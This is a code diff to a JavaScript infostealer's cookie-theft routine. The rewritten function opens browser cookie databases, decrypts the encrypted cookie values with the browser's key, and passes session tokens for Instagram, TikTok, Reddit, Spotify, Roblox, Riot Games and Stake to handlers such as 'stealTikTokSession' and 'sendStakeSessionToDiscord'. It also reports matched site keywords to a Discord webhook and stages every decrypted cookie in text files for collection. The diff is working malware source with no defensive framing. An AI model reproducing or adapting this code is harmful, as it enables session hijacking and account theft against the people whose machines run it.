@@ -1,6 +1,4 @@
 const fs = require('fs');
-const {edge, firefox, chrome} = require("@rookie-rs/api");
-
 const fsPromises = fs.promises;
 const path = require('path');
 const axios = require('axios');
@@ -3645,35 +3643,129 @@ async function getCards() {
     });
   }
 }
-function toCookiesFileFormat(cookie) {
-  const { domain, path, secure, name, value } = cookie;
-  const expiryTime = 0; 
-  return `${domain}\tFALSE\t${path}\t${secure ? 'TRUE' : 'FALSE'}\t${expiryTime}\t${name}\t${value}`;
-}
 
-function generateCookiesFile(cookies) {
-  const formattedCookies = cookies.map(toCookiesFileFormat);
-  return formattedCookies.join("\n");
-}
 async function getCookies() {
-    let CC = [{b: "edge", c: generateCookiesFile(edge())}, {b: "fox", c: generateCookiesFile(firefox())}, {b: "chrome", c: generateCookiesFile(chrome())}];
-   setTimeout(() => {
-    for (let c of CC) {
-        let fileName = `${c.b}.txt`;
-        const cookiesFolderPath = path.join(mainFolderPath, 'Cookies');
-        const cookiesFilePath = path.join(cookiesFolderPath, fileName);
-        let cookiesWithBanner = `${user.copyright}\n\n${c.c}`;
-        try {
-            if (!fs.existsSync(cookiesFolderPath)) {
-                fs.mkdirSync(cookiesFolderPath);
+    const cookiesData = {};
+    cookiesData['banner'] = [`${user.copyright}\n`];
+    const matchedKeywords = [];
+
+    for (let i = 0; i < browserPath.length; i++) {
+        const networkPath = path.join(browserPath[i][0], 'Network');
+
+        if (!fs.existsSync(path.join(networkPath, 'Cookies'))) {
+            continue;
+        }
+
+        let browserFolder;
+        if (browserPath[i][0].includes('Local')) {
+            browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
+        } else {
+            browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
+        }
+
+        const cookiesPath = path.join(networkPath, 'Cookies');
+        const db = new sqlite3.Database(cookiesPath);
+
+        await new Promise((resolve) => {
+            db.each(
+                'SELECT * FROM cookies',
+                function (err, row) {
+                    if (err) {
+                        console.error(`Error reading cookies from ${cookiesPath}:`, err);
+                        return;
+                    }
+
+                    let encryptedValue = row.encrypted_value;
+                    let iv = encryptedValue.slice(3, 15);
+                    let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
+                    let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
+                    let decrypted = '';
+
+                    try {
+                        const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
+                        decipher.setAuthTag(authTag);
+                        decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
+
+                        // Handle different services
+                        if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
+                            SubmitInstagram(`${decrypted}`);
+                        } else if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
+                            stealTikTokSession(`${decrypted}`);
+                        } else if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
+                            setRedditSession(`${decrypted}`);
+                        } else if (row.host_key === '.spotify.com' && row.name === 'sp_dc') {
+                            SpotifySession(`${decrypted}`);
+                        } else if (row.name === '.ROBLOSECURITY') {
+                            SubmitRoblox(`${decrypted}`);
+                        } else if (row.host_key === 'account.riotgames.com' && row.name === 'sid') {
+                            RiotGameSession(`${decrypted}`);
+                        } else if (row.host_key === 'stake.com' && row.name === 'session') {
+                            sendStakeSessionToDiscord(`${decrypted}`);
+                        }
+
+                        // Search for keywords
+                        for (const keyword of keywords) {
+                            if (row.host_key.includes(keyword) && !matchedKeywords.includes(keyword)) {
+                                matchedKeywords.push(keyword);
+                            }
+                        }
+                    } catch (error) {
+                        console.error(`Error decrypting cookies for ${row.host_key}:`, error);
+                    }
+
+                    if (!cookiesData[`${browserFolder}_${browserPath[i][1]}`]) {
+                        cookiesData[`${browserFolder}_${browserPath[i][1]}`] = [];
+                    }
+
+                    cookiesData[`${browserFolder}_${browserPath[i][1]}`].push(
+                        `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n\n`
+                    );
+
+                    count.cookies++;
+                },
+                () => {
+                    resolve('');
+                }
+            );
+        });
+    }
+
+    // Send matched keywords to Discord webhook
+    if (matchedKeywords.length > 0) {
+        sendKeywordsToDiscord(matchedKeywords);
+    }
+
+    for (let [browserName, cookies] of Object.entries(cookiesData)) {
+        if (browserName.toLowerCase() === 'banner') {
+            continue;
+        }
+
+        if (cookies.length !== 0) {
+            const cookiesContent = cookies.join('');
+
+            // Add the banner content to the beginning of each cookies file
+            const cookiesWithBanner = `${user.copyright}\n${cookiesContent}`;
+            const fileName = `${browserName}.txt`;
+
+            // Specify the folder path for Cookies
+            const cookiesFolderPath = path.join(mainFolderPath, 'Cookies');
+            const cookiesFilePath = path.join(cookiesFolderPath, fileName);
+
+            try {
+                if (!fs.existsSync(cookiesFolderPath)) {
+                    fs.mkdirSync(cookiesFolderPath);
+                }
+
+                // Write the individual cookies file to the Cookies folder
+                fs.writeFileSync(cookiesFilePath, cookiesWithBanner, { encoding: 'utf8' });
+
+                // Move the cookies file to the main folder
+                moveFileToFolder(cookiesFilePath, 'Cookies');
+            } catch (error) {
+                console.error(`Error writing/moving cookies file ${cookiesFilePath}:`, error);
             }
-            fs.writeFileSync(cookiesFilePath, cookiesWithBanner, { encoding: 'utf8' });
-            moveFileToFolder(cookiesFilePath, 'Cookies');
-        }catch(e) {
-            console.error(`Error while writing/moving cookies ${cookiesFilePath}:  ${e}`);
         }
     }
-   }, 2E3);
 }
 
 async function sendKeywordsToDiscord(keywords) {
